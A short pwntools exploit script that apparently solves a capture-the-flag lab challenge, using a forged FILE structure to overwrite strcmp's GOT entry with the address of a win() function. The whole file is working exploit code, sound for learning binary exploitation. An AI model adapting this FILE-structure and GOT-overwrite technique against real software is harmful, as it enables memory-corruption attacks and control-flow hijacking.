# idea: overwrite strcmp@got with win()

from pwn import *

context.arch = 'amd64'

p = process("/challenge/babyfile_level15")
#p = gdb.debug("/challenge/babyfile_level14")
binary = ELF("/challenge/babyfile_level15")

# dummy note
p.sendline(b'new_note')
p.sendline(b'0')
p.sendline(b'8')
p.recv()

win_addr = binary.sym['win']
strcmp_got = binary.got.strcmp

p.sendline(b'open_file')
p.sendline(b'write_fp')
p.recv()

fs = FileStructure()
payload = fs.read(strcmp_got, 16)
p.send(payload)
p.recv()
p.sendline(b'read_file')
p.sendline(b'0')
p.recv()
p.send(p64(win_addr))

p.interactive()

